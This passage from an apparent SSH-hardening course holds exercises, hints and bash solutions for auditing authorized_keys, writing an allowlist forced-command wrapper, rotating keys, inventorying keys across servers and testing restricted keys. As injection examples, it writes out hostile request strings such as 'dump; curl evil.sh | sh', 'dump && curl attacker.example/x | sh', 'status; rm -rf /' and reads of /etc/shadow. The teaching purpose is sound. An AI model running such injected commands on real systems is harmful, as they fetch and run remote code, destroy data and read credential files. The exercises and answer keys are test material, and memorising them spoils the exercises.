  # Ranh gioi: truong dau tien la LOAI KHOA.
  idx=0; keyidx=0
  for field in $line; do
    idx=$((idx + 1))
    case "$field" in ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;; esac
  done
  [ "$keyidx" -eq 0 ] && continue

  # Phan tuy chon = moi thu TRUOC loai khoa. Phan loai chi duoc nhin vao
  # day. Tim "command=" tren CA DONG se khop nham voi mot chu thich
  # kieu "laptop-command-center", con "restrict" khop nham voi
  # "restricted-laptop" — hai lan bao sai lien tiep.
  if [ "$keyidx" -gt 1 ]; then
    opts=$(printf '%s\n' "$line" | cut -d' ' -f1-$((keyidx - 1)))
  else
    opts=""
  fi

  keypart=$(printf '%s\n' "$line" | cut -d' ' -f"$keyidx"-)
  comment=$(printf '%s\n' "$keypart" | cut -d' ' -f3-)
  [ -z "$comment" ] && comment='(no-comment)'

  has_cmd=0; has_restrict=0
  case "$opts" in *command=*)  has_cmd=1 ;; esac
  case "$opts" in *restrict*)  has_restrict=1 ;; esac

  if [ -z "${opts// /}" ]; then
    class=OPEN;     open=$((open + 1))
  elif [ "$has_cmd" -eq 1 ] && [ "$has_restrict" -eq 1 ]; then
    class=LOCKED;   locked=$((locked + 1))
  elif [ "$has_cmd" -eq 1 ]; then
    class=COMMAND;  cmd=$((cmd + 1))
  else
    class=PARTIAL;  partial=$((partial + 1))
  fi

  echo "$class line $n $comment"

  # Chi bao dong voi khoa TU KHAI la cua may. Mot cai khoa laptop khong
  # co rang buoc la binh thuong; bao dong ca no thi danh sach dai toi muc
  # khong ai xu ly, va the la bo sot cai that su quan trong.
  if [ "$class" = "OPEN" ]; then
    lc=$(printf '%s\n' "$comment" | tr '[:upper:]' '[:lower:]')
    case "$lc" in
      *ci*|*deploy*|*backup*|*bot*|*runner*) finding=1 ;;
    esac
  fi
done < "$FILE"

echo "summary: $open open, $partial partial, $cmd command, $locked locked"
[ "$finding" -eq 1 ] && exit 1
exit 0

exercises.solutionExplanationHtml:
Classifying from the options substring only. Searching the entire line is the obvious shortcut and it produces false positives from two directions: a comment such as laptop-command-center contains command, and restricted-laptop contains restrict. Both would upgrade a fully open key to LOCKED — an audit tool reporting that the most dangerous key is the safest one. Cutting the line at the key-type boundary and examining only what precedes it removes the possibility entirely.

PARTIAL exists as a class because no-pty is widely mistaken for a real restriction. It blocks an interactive terminal, and that is all: ssh host 'cat /etc/shadow' still runs, because running a command needs no pty (Module 1). A key marked no-pty feels locked down and grants arbitrary command execution. Giving it a class of its own, distinct from both OPEN and COMMAND, is what makes the report say something true.

The automation heuristic is what makes the exit status usable as a gate. Flagging every unrestricted key produces a list dominated by people's laptops, which are supposed to be unrestricted — and a report that is mostly noise gets ignored, at which point it fails to surface the one line that matters. Restricting the finding to keys whose own comment identifies them as machinery gives a short list that is almost always actionable. It is a heuristic and it can miss a badly-named key; the honest framing is that it catches the common case cheaply rather than that it is complete.

Two implementation details worth keeping. The finding flag is set rather than exiting inside the loop, so the full report and the summary always print — a gate that truncates its own output makes the failure harder to fix than it needs to be. And tr '[:upper:]' '[:lower:]' is used instead of ${comment,,} because the latter is bash 4 syntax and macOS ships bash 3.2, where it is a syntax error rather than a graceful degradation.

exercises.title: Write a Forced Command That Cannot Be Talked Out Of It
exercises.problemHtml:
A command= entry in authorized_keys replaces whatever the client asked for. The client's request is not discarded, though — it is handed to your script in $SSH_ORIGINAL_COMMAND, and the moment you use that variable you have re-opened the door you just closed.

This is where most forced-command wrappers go wrong. Passing the variable to a shell, or interpolating it into a command line, gives the client arbitrary execution through a key that was supposed to allow one operation.

Write backup-only.sh, the target of a command= entry, supporting exactly three operations chosen by an allowlist.

  • dump — run docker exec cuonghoangdev_postgres pg_dump -U postgres cuonghoangdev_db and stream it to stdout.
  • list — print the names of files in /opt/backups, one per line.
  • status — print ok and the current UTC date.
  • Anything else, including an empty request: print DENIED: <what was requested> to stderr and exit 77.
  • The requested string must be compared against the three literals with an exact match. Never pass it to eval, never expand it unquoted, and never build a command line by concatenation.
  • Log every request — accepted or denied — to /var/log/backup-key.log as <iso-date> <client-ip> <verdict> <request>, taking the client address from $SSH_CONNECTION.

Then show, as a comment block at the top of the file, the exact authorized_keys line that installs it — including restrict, because a forced command alone still permits port forwarding, and a key that can open tunnels into your network is not restricted in any meaningful sense.
exercises.inputSpec: The environment variable SSH_ORIGINAL_COMMAND holds whatever the client asked to run; it may be empty, may contain spaces, quotes, semicolons and shell metacharacters, and is entirely attacker-controlled. SSH_CONNECTION holds 'client-ip client-port server-ip server-port'.
exercises.outputSpec: For an allowed verb, that operation's output on stdout and exit 0. Otherwise 'DENIED: <request>' on stderr and exit 77. One log line per invocation either way.
exercises.constraints: No eval, no `sh -c "$SSH_ORIGINAL_COMMAND"`, no unquoted expansion of the variable, and no building commands by string concatenation. Comparison must be exact equality against the three literals — prefix or substring matching is not acceptable.

examplesJson.explanation: SSH_ORIGINAL_COMMAND is exactly 'status', which matches an allowlist entry. The verb is never executed as text; it selects a branch.

examplesJson.output:
DENIED: status; rm -rf /   (on stderr)
$? = 77
examplesJson.explanation: Exact matching means the whole string has to equal 'status'. A wrapper using a case pattern like status*) or passing the variable to a shell would have run both halves.

examplesJson.output:
DENIED:    (on stderr)
$? = 77
examplesJson.explanation: Asking for an interactive shell leaves SSH_ORIGINAL_COMMAND unset. Defaulting to a shell here would undo the entire point; the unset case must be denied like any other unknown request.

hintsJson: Read the variable with a default so an unset value does not abort under set -u: `req=${SSH_ORIGINAL_COMMAND:-}`.

Use `case "$req" in dump) ...;; list) ...;; status) ...;; *) deny;; esac`. Note there is no glob in those patterns — 'dump)' matches only the exact string, while 'dump*)' would match 'dump; curl evil.sh | sh'.
The client IP is the first field of SSH_CONNECTION: `set -- $SSH_CONNECTION; ip=$1`, or `ip=${SSH_CONNECTION%% *}`.
Write the log before branching so denied attempts are recorded too, and use `>>` with a date from `date -u +%FT%TZ`. A security log that only records successes is not a security log.

#!/usr/bin/env bash
# Muc tieu cua mot dong command= trong authorized_keys.
#
# Dong cai dat (LUU Y co restrict — chi command= thi VAN cho mo duong ham):
#   restrict,command="/usr/local/bin/backup-only.sh" ssh-ed25519 AAAA... backup-puller
#
set -uo pipefail

LOG=/var/log/backup-key.log

# 1) Yeu cau cua client. Coi day la du lieu THU DICH: no di thang tu
#    dong lenh cua nguoi goi vao bien nay, khong qua bo loc nao.
req=${SSH_ORIGINAL_COMMAND:-}
ip=${SSH_CONNECTION%% *}          # truong dau tien = IP cua client
ip=${ip:-unknown}

log() {
  # Ghi CA lan bi tu choi. Mot cuon nhat ky chi ghi thanh cong thi khong
  # phai nhat ky an ninh — thu ban can doc lai chinh la cac lan that bai.
  printf '%s %s %s %s\n' "$(date -u +%FT%TZ)" "$ip" "$1" "$req" >> "$LOG" 2>/dev/null || true
}

deny() {
  log DENIED
  echo "DENIED: $req" >&2
  exit 77
}

# 2) Danh sach cho phep. Cac mau duoi day KHONG co ky tu dai dien:
#    `dump)` khop DUNG chuoi "dump" va khong khop gi khac.
#    Viet `dump*)` la mo cua cho "dump; curl ke-xau.sh | sh".
#    Chuoi cua client KHONG BAO GIO duoc chay nhu ma lenh — no chi duoc
#    dung de CHON NHANH. Do la khac biet giua danh sach cho phep va
#    mot cai vo boc chi lam ra ve an toan.
case "$req" in
  dump)
    log ALLOW
    exec docker exec cuonghoangdev_postgres \
         pg_dump -U postgres cuonghoangdev_db
    ;;
  list)
    log ALLOW
    # -1 va -- : ten file bat dau bang dau gach cung khong bi doc thanh co
    ls -1 -- /opt/backups
    exit 0
    ;;
  status)
    log ALLOW
    echo "ok $(date -u +%FT%TZ)"
    exit 0
    ;;
  *)
    deny
    ;;
esac

exercises.solutionExplanationHtml:
The variable selects a branch; it is never executed. That single sentence is the security property. Every broken forced-command wrapper violates it in one of three ways: eval "$SSH_ORIGINAL_COMMAND", sh -c "$SSH_ORIGINAL_COMMAND", or interpolating it into another command such as pg_dump $SSH_ORIGINAL_COMMAND. All three hand arbitrary execution to whoever holds the key, which means the command= option bought nothing at all.

dump) versus dump*) is the whole difference between an allowlist and decoration. The glob form matches dump; rm -rf /, dump && curl attacker.example/x | sh and dump --file=/etc/shadow. Since the branch body would then run with the attacker's suffix still in the variable, any later use of it executes their text. Exact equality is not a stylistic preference here; it is what makes the set of reachable behaviours finite and enumerable.

Denying the empty request matters more than it looks. Asking for an interactive shell leaves SSH_ORIGINAL_COMMAND unset, and a wrapper that treats "no request" as "give them a shell" has inverted its own purpose — the most privileged outcome reachable through the least specific input. ${SSH_ORIGINAL_COMMAND:-} supplies an empty default so set -u does not abort, and the empty string then falls through to *) like any other unknown verb.

restrict in the installation line is not redundant. A command= entry constrains what runs when a session opens; it does nothing about port forwarding. Without restrict, the holder of this key can run ssh -L 5432:localhost:5432 host and reach Postgres directly, bypassing the wrapper entirely. The forced command guards one door while the tunnel walks around the building.

Logging before branching is the operational half. Accepted requests are the boring ones; the log line you will actually want six months from now is the denied attempt from an address you do not recognise, and a wrapper that logs only successes cannot produce it. The || true on the log write keeps a full disk or a permissions problem from turning a working backup key into a broken one.

exercises.title: Rotate a Key Without Locking Yourself Out
exercises.problemHtml:
Rotating a key means replacing an old one with a new one on every server that trusts it. Done in the wrong order it is the single most reliable way to lock yourself out of a machine you administer: remove the old key, discover the new one does not work, and now have no way in to fix it.

The safe order is not complicated, and it is worth writing down as code because under time pressure people do it backwards.

Write rotate-key.sh OLD_PUB NEW_PUB HOST:

  1. Confirm the old key currently works. If it does not, stop with ABORT old key does not work — fix access first and exit 1. Rotating from a broken state produces a machine nobody can reach.
  2. Install the new key alongside the old one, appending, and idempotently.
  3. Verify the new key works on a fresh connection. If it does not, leave the old key in place, print ABORT new key does not work — old key left intact and exit 2. This is the step that makes the whole operation reversible.
  4. Only now remove the old key, matching on its base64 field.
  5. Verify one final time that the new key still works and the old one no longer does. Print ROTATED old=<fp> new=<fp> and exit 0.
  6. If the final check finds the old key still working, print WARN old key still accepted to stderr and exit 3 — usually it was installed for a second user as well.

Every mutating step must be preceded by a check whose failure leaves the system in a working state. Write the removal with grep -vF into a temporary file and move it into place, so a failure part-way cannot truncate authorized_keys.
exercises.inputSpec: argv[1] and argv[2] are paths to the old and new .pub files; the matching private keys must sit alongside them without the .pub suffix. argv[3] is the SSH destination.
exercises.outputSpec: 'ROTATED old=SHA256:<fp> new=SHA256:<fp>' on success (exit 0); one of the ABORT lines (exit 1 or 2); or 'WARN old key still accepted' on stderr (exit 3).
exercises.constraints: Never remove the old key before the new one has been proved to work. The removal must be atomic — build the new file then move it, never edit in place. Match keys by base64 field. All verification connections must use BatchMode=yes and PreferredAuthentications=publickey.

examplesJson.output: ROTATED old=SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8 new=SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0
examplesJson.explanation: Old key verified, new key installed and verified, old key removed, final state confirmed. At no point was the machine reachable by neither key.

examplesJson.input: ./rotate-key.sh ~/.ssh/id_old.pub ~/.ssh/id_new.pub cuong@may   # new private key has a passphrase
examplesJson.output:
ABORT new key does not work — old key left intact
$? = 2
examplesJson.explanation: The new key is installed but unusable under BatchMode, exactly as in the key-doctor exercise. Because verification precedes removal, access via the old key is untouched and the situation is fully recoverable.

examplesJson.input: ./rotate-key.sh ~/.ssh/id_old.pub ~/.ssh/id_new.pub cuong@may   # old key was never installed
examplesJson.output:
ABORT old key does not work — fix access first
$? = 1
examplesJson.explanation: Stopping here prevents the worst outcome. Continuing would install a new key with no working fallback, and if that key also failed the machine would be unreachable.

hintsJson: Write one `works()` helper taking a private key path and returning success or failure, then call it three times. Duplicating the ssh invocation invites the flags to drift apart between checks.
For the removal, build the file with `grep -vF -- "$OLD_B64" ~/.ssh/authorized_keys > tmp && mv tmp ~/.ssh/authorized_keys`. Editing in place risks truncation if anything fails mid-write.
Preserve the mode: create the temp file in the same directory and chmod 600 before the mv, so the result is never briefly world-readable.

For the final negative check, remember an old key that still works usually means it is installed for another user too, or a second authorized_keys file (authorized_keys2) is in play — report it rather than silently trying harder.

solutionCodeJson.name: rotate-key.sh
solutionCodeJson.code:
#!/usr/bin/env bash
# Doi khoa theo THU TU AN TOAN. Lam nguoc thu tu la tu khoa minh o ngoai.
set -uo pipefail

OLD_PUB=${1:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}
NEW_PUB=${2:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}
HOST=${3:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}

OLD_PRIV=${OLD_PUB%.pub}
NEW_PRIV=${NEW_PUB%.pub}
OLD_B64=$(awk '{print $2}' "$OLD_PUB")
NEW_LINE=$(head -1 "$NEW_PUB")
NEW_B64=$(awk '{print $2}' "$NEW_PUB")
OLD_FP=$(ssh-keygen -lf "$OLD_PUB" | awk '{print $2}')
NEW_FP=$(ssh-keygen -lf "$NEW_PUB" | awk '{print $2}')

# Mot ham duy nhat cho ca ba lan kiem. Chep lai lenh ssh ba cho la ba co
# hoi de cac tham so troi khoi nhau — va mot phep kiem dung tham so khac
# voi phep kiem kia thi khong con so sanh duoc voi nhau nua.
works() {
  ssh -o BatchMode=yes \
      -o PreferredAuthentications=publickey \
      -o IdentitiesOnly=yes \
      -o ConnectTimeout=10 \
      -i "$1" "$HOST" true 2>/dev/null
}

# ── 1) Khoa CU phai dang chay ───────────────────────────────────────
# Doi khoa tu mot trang thai von da hong se tao ra mot may khong ai vao duoc.
if ! works "$OLD_PRIV"; then
  echo "ABORT old key does not work — fix access first"
  exit 1
fi

# ── 2) Cai khoa MOI BEN CANH khoa cu ────────────────────────────────
# Dung CHINH khoa cu de cai — ta vua chung minh no chay o buoc 1. Neu de
# lenh nay tu tim thong tin dang nhap, no se quay ve hoi mat khau va
# script treo giua chung mot thao tac doi khoa, dung trang thai te nhat.
ssh -o BatchMode=yes -o IdentitiesOnly=yes -i "$OLD_PRIV" \
    "$HOST" "LINE='$NEW_LINE' B64='$NEW_B64' bash -s" <<'REMOTE' >/dev/null
  set -euo pipefail
  mkdir -p ~/.ssh; chmod 700 ~/.ssh; touch ~/.ssh/authorized_keys
  grep -qF -- "$B64" ~/.ssh/authorized_keys || printf '%s\n' "$LINE" >> ~/.ssh/authorized_keys
  chmod 600 ~/.ssh/authorized_keys
REMOTE

# ── 3) Khoa MOI phai chay — TRUOC khi go bat cu thu gi ──────────────
# Day la buoc bien ca thao tac thanh co the lui lai duoc.
if ! works "$NEW_PRIV"; then
  echo "ABORT new key does not work — old key left intact"
  exit 2
fi

# ── 4) Gio moi go khoa cu ───────────────────────────────────────────
# Dung ra file tam roi mv: mv trong cung mot he thong tep la nguyen tu,
# nen authorized_keys hoac la ban cu tron ven hoac la ban moi tron ven,
# khong bao gio la mot file bi cat cut giua chung.
# Buoc nay dung khoa MOI: no vua duoc chung minh o buoc 3, va dung no o
# day con la mot lan xac nhan nua rang khoa moi that su lam viec duoc
# TRUOC khi khoa cu bien mat.
ssh -o BatchMode=yes -o IdentitiesOnly=yes -i "$NEW_PRIV" \
    "$HOST" "B64='$OLD_B64' bash -s" <<'REMOTE' >/dev/null
  set -euo pipefail
  tmp=$(mktemp ~/.ssh/ak.XXXXXX)     # cung thu muc -> mv la nguyen tu
  chmod 600 "$tmp"                   # dat quyen TRUOC khi no vao vi tri
  grep -vF -- "$B64" ~/.ssh/authorized_keys > "$tmp" || true
  mv "$tmp" ~/.ssh/authorized_keys
REMOTE

# ── 5) Kiem lan cuoi: moi con chay, cu phai KHONG con chay ──────────
if ! works "$NEW_PRIV"; then
  echo "ABORT new key stopped working after removal" >&2
  exit 2
fi

if works "$OLD_PRIV"; then
  # Thuong la khoa cu con duoc cai cho MOT NGUOI DUNG KHAC, hoac con
  # nam trong authorized_keys2. Bao ra, dung im lang thu manh tay hon.
  echo "WARN old key still accepted" >&2
  exit 3
fi

echo "ROTATED old=$OLD_FP new=$NEW_FP"
exit 0

exercises.solutionExplanationHtml:
The ordering is the entire exercise. Check old, add new, verify new, remove old, verify both. Every mutation is preceded by a check whose failure leaves a working state behind, which means there is no point in the sequence where a failure produces an unreachable machine. Doing it in the natural-sounding order — remove the old key first, then install the new one — creates a window in which the only access is the connection you happen to be sitting in, and if the new key turns out to be passphrase-protected (the previous exercise) that window never closes.

Step 1 exists to prevent a subtler disaster. If the old key is already not working, rotating from that state installs a new key with no verified fallback. Should the new key also fail, the machine has no working key at all — and the operator does not find out until the current session ends. Refusing to start is the correct behaviour, even though it feels obstructive when you are in a hurry.

Atomic removal. grep -vF into a temp file followed by mv means authorized_keys is always either the complete old version or the complete new one. Editing in place — with sed -i, or a redirect into the same file — can leave a truncated file if the disk fills or the connection drops mid-write, and a truncated authorized_keys is an immediate lockout. The temp file is created in ~/.ssh rather than /tmp so that mv stays within one filesystem and therefore stays atomic; chmod 600 happens before the mv, so there is never an instant where the live file is more permissive than it should be.

The final negative check is not paranoia. An old key that still works after removal almost always means it was installed in more than one place: a second user's authorized_keys, or the authorized_keys2 file that this server's config still lists (visible in sshd -T output as authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2). Reporting that as a warning rather than quietly searching harder keeps the tool predictable — it did what it was asked, and it is telling you the goal was not fully achieved.

works() as a single helper called three times matters more than it appears. Three hand-written ssh invocations drift: one gains a -p, another loses IdentitiesOnly, and then the "new key works" check and the "old key no longer works" check are no longer measuring the same thing — which makes the final verdict meaningless in exactly the situation where you most need to trust it.

exercises.title: Build a Key Inventory Across Several Servers
exercises.problemHtml:
After a year, nobody knows which keys are on which servers. Someone left the team six months ago; is their key still installed anywhere? A laptop was stolen; which machines does it still open? These questions are unanswerable by memory and trivially answerable by a script, because a fingerprint is a stable identity for a key regardless of what comment it carries or which file it lives in.

Write key-inventory.sh HOSTFILE KNOWNFILE:

  • HOSTFILE lists SSH destinations, one per line, with # comments allowed.
  • KNOWNFILE maps fingerprints to owners: SHA256:… alice-laptop, one per line.
  • For each host, read ~/.ssh/authorized_keys and fingerprint every key.
  • Print <host> <fingerprint> <owner-or-UNKNOWN> for each key found.
  • A host that cannot be reached must not stop the run: print <host> UNREACHABLE and continue. A fleet audit that dies on the first offline machine is useless precisely when a machine is offline.
  • Finish with three summary sections: ORPHAN <fp> on <n> host(s) for every fingerprint not in KNOWNFILE; MISSING <owner> for every known owner found on no host; and UNREACHABLE <n> host(s).
  • Exit 1 if any orphan was found, otherwise 0.

Report the unreachable count in the summary even when it is zero. A number that is always present is read; a line that appears only sometimes is missed — and "no orphans found" means something very different when four hosts were never contacted.
exercises.inputSpec: argv[1] is a file of SSH destinations, one per line, # comments allowed. argv[2] is a file of 'SHA256:<fp> <owner>' lines. Both may contain blank lines.
exercises.outputSpec: One '<host> <fp> <owner|UNKNOWN>' line per key, plus '<host> UNREACHABLE' lines, then ORPHAN / MISSING / UNREACHABLE summary lines. Exit 1 when any orphan exists, else 0.
exercises.constraints: One unreachable host must never abort the run. Use BatchMode=yes and a connect timeout so an offline host fails quickly. Fingerprints are the identity — never match on comments, which are freely editable and frequently wrong. Count each fingerprint once per host even if it appears twice in a file.

hintsJson: Accumulate into three parallel structures: a set of seen fingerprints, a count of hosts per fingerprint, and a set of owners actually found. In bash 3.2 there are no associative arrays — use newline-delimited strings and grep, or a temp file per structure.

Wrap the per-host ssh in an if so a failure is handled rather than fatal — and pass `-n`: `if out=$(ssh -n -o BatchMode=yes -o ConnectTimeout=10 "$h" 'cat ~/.ssh/authorized_keys 2>/dev/null'); then ... else echo "$h UNREACHABLE"; fi`. Without -n, ssh reads the same stdin the while-loop is reading the host list from, swallows the remaining hosts on the first iteration, and the audit silently covers exactly one machine.

Deduplicate per host before counting, otherwise a file containing the same key twice inflates the host count for that fingerprint and the ORPHAN line reports a number that does not correspond to machines.
Compute MISSING by subtracting the set of owners found from the set in KNOWNFILE — `comm -13` on two sorted lists does it in one step.

solutionCodeJson.code:
#!/usr/bin/env bash
# Khoa nao dang nam tren may nao? Dau van tay la danh tinh, chu thich thi khong.
set -uo pipefail

HOSTFILE=${1:?usage: key-inventory.sh HOSTFILE KNOWNFILE}
KNOWNFILE=${2:?usage: key-inventory.sh HOSTFILE KNOWNFILE}
[ -r "$HOSTFILE" ]  || { echo "khong doc duoc $HOSTFILE" >&2;  exit 1; }
[ -r "$KNOWNFILE" ] || { echo "khong doc duoc $KNOWNFILE" >&2; exit 1; }

work=$(mktemp -d)
cleanup() { rm -rf "$work" 2>/dev/null; return 0; }
trap cleanup EXIT

line="$work/line"; seen="$work/seen"; owners="$work/owners"
: > "$seen"; : > "$owners"
unreachable=0

owner_of() {
  # Tra ve chu so huu ung voi dau van tay, hoac rong.
  awk -v fp="$1" '$1 == fp { $1=""; sub(/^ /,""); print; exit }' "$KNOWNFILE"
}

while IFS= read -r host || [ -n "$host" ]; do
  [ -z "${host// /}" ] && continue
  case "${host#"${host%%[! ]*}"}" in \#*) continue ;; esac

  # Mot may tat dien KHONG duoc phep giet ca cuoc kiem ke — dung luc
  # co may chet moi la luc ban can bao cao nay nhat.
  # -n LA BAT BUOC. Vong lap nay dang doc HOSTFILE tren stdin, va ssh cung
  # doc stdin — no se hut sach phan con lai cua danh sach host ngay o lan
  # lap dau tien, nen may thu hai tro di khong bao gio duoc kiem. Trieu
  # chung: bao cao chay xong, khong bao loi, va chi co dung MOT host trong
  # ket qua. -n noi stdin cua ssh vao /dev/null.
  if ! remote=$(ssh -n -o BatchMode=yes -o ConnectTimeout=10 "$host" \
                'cat ~/.ssh/authorized_keys 2>/dev/null' 2>/dev/null); then
    echo "$host UNREACHABLE"
    unreachable=$((unreachable + 1))
    continue
  fi

  # Gom dau van tay cua RIENG host nay, roi loc trung TRUOC khi dem.
  # Mot file co cung mot khoa hai lan khong co nghia la hai cai may.
  hostfps="$work/hostfps"; : > "$hostfps"
  while IFS= read -r l || [ -n "$l" ]; do
    [ -z "${l// /}" ] && continue
    case "${l#"${l%%[! ]*}"}" in \#*) continue ;; esac
    idx=0; keyidx=0
    for field in $l; do
      idx=$((idx + 1))
      case "$field" in ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;; esac
    done
    [ "$keyidx" -eq 0 ] && continue
    printf '%s\n' "$l" | cut -d' ' -f"$keyidx"- > "$line"
    fp=$(ssh-keygen -lf "$line" 2>/dev/null | awk '{print $2}') || continue
    [ -n "$fp" ] && echo "$fp" >> "$hostfps"
  done <<EOF
$remote
EOF

  sort -u "$hostfps" > "$hostfps.u"
  while IFS= read -r fp; do
    [ -z "$fp" ] && continue
    who=$(owner_of "$fp")
    if [ -n "$who" ]; then
      echo "$host $fp $who"
      echo "$who" >> "$owners"
    else
      echo "$host $fp UNKNOWN"
    fi
    echo "$fp" >> "$seen"      # mot dong moi HOST -> dem duoc so may
  done < "$hostfps.u"
done < "$HOSTFILE"

# ── Tong ket ────────────────────────────────────────────────────────
orphan_found=0
# Dung THAY THE TIEN TRINH `< <(...)` chu KHONG dung ong.
# Hai ly do, ca hai deu tung lam script nay bao sai:
#  1) `... | while ...` chay than vong lap trong SUBSHELL, nen bien
#     orphan_found dat ben trong se bien mat khi ong ket thuc.
#  2) Cach chua quen thuoc `... | grep -q x` cung sai khi dang bat
#     `pipefail`: grep -q thoat NGAY khi tim thay, dong ong lai, cac tang
#     truoc an SIGPIPE va tra ve khac 0, nen CA pipeline thanh that bai
#     dung vao luc no vua tim THAY thu can tim.
# Ket qua cua ca hai lo nay giong het nhau: bao cao in ra dung, ma ma
# thoat luon la 0 — mot cai cong bao mat khong bao gio dong.
while read -r count fp; do
  [ -z "$fp" ] && continue
  if [ -z "$(owner_of "$fp")" ]; then
    echo "ORPHAN $fp on $count host(s)"
    orphan_found=1
  fi
done < <(sort "$seen" | uniq -c)

# MISSING: chu so huu co trong danh sach ma khong thay o dau ca.
awk 'NF { $1=""; sub(/^ /,""); print }' "$KNOWNFILE" | sort -u > "$work/all_owners"
sort -u "$owners" > "$work/found_owners"
comm -13 "$work/found_owners" "$work/all_owners" | while read -r o; do
  [ -n "$o" ] && echo "MISSING $o"
done

# In KE CA khi bang 0: "khong co khoa la" mang y nghia khac han neu
# bon con may chua he duoc hoi toi.
echo "UNREACHABLE $unreachable host(s)"

[ "$orphan_found" -eq 1 ] && exit 1
exit 0

exercises.solutionExplanationHtml:
Fingerprints are the identity; comments are not. The comment field is free text that anyone with write access can change, is frequently copied between keys, and is often just user@hostname from a laptop that has since been reimaged. Matching on it produces an inventory that is confidently wrong. The fingerprint is derived from the key material itself, so the same key reports the same fingerprint on every server, under every comment, with or without options in front of it.

Partial failure must not be total failure. The if ! remote=$(ssh …) shape converts an unreachable host into a reported line and a continued loop. A fleet audit is most valuable when the fleet is in a bad state, and a script that aborts on the first offline machine is guaranteed to be useless in exactly that situation. Reporting the unreachable count unconditionally — including when it is zero — is the other half of the same idea: MISSING backup-puller is a finding when every host answered, and is meaningless when four did not, so the reader needs both numbers in front of them without having to notice an absent line.

ssh -n is load-bearing, and leaving it out produces the most deceptive bug in this exercise. The while loop reads the host list on stdin. ssh also reads stdin — that is what makes cmd | ssh host 'cat > file' work in Module 1. Inside the loop those are the same stream, so on the very first iteration ssh consumes every remaining line of the host file. The loop then finds nothing left to read and exits. The script reports no error, exits 0, prints UNREACHABLE 0 host(s), and has audited exactly one machine out of forty. Nothing in the output hints that anything was skipped. -n redirects ssh's stdin from /dev/null and fixes it; ssh … < /dev/null is equivalent. This is worth remembering as a general rule: any command inside a while read loop that might read stdin needs -n or an explicit redirect.

Deduplicating per host before counting. The same key appearing twice in one authorized_keys is common after a few careless ssh-copy-id runs. Counting raw occurrences would report ORPHAN … on 2 host(s) for a key present on one machine, and a count that does not correspond to machines is worse than no count, because remediation is planned from it. Sorting each host's fingerprints with sort -u before adding them to the global tally keeps the number meaning what it says.

Two ways to lose the exit status, both of which this script hit while being written. The summary needs to set a flag inside a loop over sort | uniq -c, and the two obvious ways to write that are both wrong in the same direction — the report prints perfectly and the exit status is always 0, so a gate built on it never fires.

  • The subshell. sort … | while read … runs the loop body in a subshell. orphan_found=1 set inside it is discarded when the pipeline ends, and the parent sees the original 0.
  • SIGPIPE plus pipefail. The usual workaround is … | grep -q x to test whether the loop emitted anything. grep -q exits the moment it finds a match and closes the pipe; the upstream stages then die of SIGPIPE and report failure; with pipefail the whole pipeline's status is therefore non-zero precisely when the match was found. The condition reads exactly backwards.

Feeding the loop with process substitution — done < <(sort "$seen" | uniq -c) — avoids both: the loop body runs in the current shell so the flag survives, and there is no pipe into the loop to break. The same reasoning is why the per-host key loop is fed by a heredoc rather than a pipe.

exercises.title: Provision a Least-Privilege Key and Prove the Limits Hold
exercises.problemHtml:
The module's capstone. Provisioning a restricted key is easy; the part everyone skips is proving the restrictions actually took effect. A typo in the options string produces a key that works perfectly for its intended job and quietly grants a full shell — and since the intended job succeeds, nothing ever reveals it.

Write provision-key.sh HOST NAME [VERB] that performs the whole operation and then attacks its own work. VERB is a request the forced command accepts (default status, matching the allowlist wrapper from the previous exercise); the positive test uses it.

  1. Generate an Ed25519 key at ./NAME with no passphrase, refusing to overwrite an existing one.
  2. Install it on HOST with the options restrict,command="/usr/local/bin/NAME-only.sh", appending and idempotently.
  3. Run one positive test: connecting with the key must produce the forced command's output. Print POSITIVE ok or POSITIVE failed.
  4. Run four negative tests, each of which must be refused:
    • NEG shell — request an interactive terminal with -tt; must fail or report a PTY refusal.
    • NEG arbitrary — ask to run id; the output must be the forced command's, not id's.
    • NEG tunnel — request -L 15432:localhost:5432; the forward must be refused.
    • NEG agent — request agent forwarding with -A; must not be granted.
  5. Print one line per test as <name> ok when the restriction held or <name> LEAK when it did not.
  6. Exit 0 only if the positive test passed and all four negative tests held. Any leak exits 6.

A provisioning tool that only runs the positive test tells you the key works. This one tells you the key only works for that, which is the property you were actually trying to create.
exercises.inputSpec: argv[1] is the SSH destination, which must already be reachable with an existing working credential. argv[2] is a base name used for the key file and the forced-command script path. argv[3] is an optional verb the forced command accepts, defaulting to "status".
exercises.outputSpec: 'POSITIVE ok|failed' followed by four lines 'NEG shell|arbitrary|tunnel|agent ok|LEAK', then 'RESULT locked' or 'RESULT leaking'. Exit 0 when fully locked, 6 on any leak, 1 on setup failure.
exercises.constraints: Every test connection must use BatchMode=yes, IdentitiesOnly=yes and -i with the new key, so nothing else can satisfy the login. A negative test that fails to connect at all counts as 'ok' only when the refusal is the expected one — a network error must not be scored as a passing restriction. The connectivity pre-check must treat only exit status 255 as "could not connect" — a well-built wrapper returns a non-zero status for a request it refuses, and that is it working correctly, not a connection failure.

The forced command still runs perfectly, so the positive test passes and everything looks fine until the negative tests run. hintsJson: The tunnel test cannot be done by checking whether the local port opened. With -L, ssh binds the local port immediately whether or not the server agrees, so `nc -z 127.0.0.1 15432` succeeds even when the server logged 'refused local port forward'. Open the forward, then actually read bytes through it — an SSH banner coming back is the only proof the tunnel is live.

For the arbitrary-command test, do not check the exit status — a forced command returns 0 whatever the client asked for. Compare the output instead: it must be the forced command's output, and must not contain 'uid=' from id.
For the shell test, capture stderr: the observable signal is the string 'PTY allocation request failed'. Treat a clean interactive shell as a LEAK.

For the agent test, do not try to read SSH_AUTH_SOCK on the far side — a forced command ignores the command you sent, so you never see that environment. Run with -v and read the server's own report instead: it sends back a line 'Remote: .../authorized_keys:1: key options: ...' listing exactly what is in force, and agent-forwarding appears there only when it is permitted.
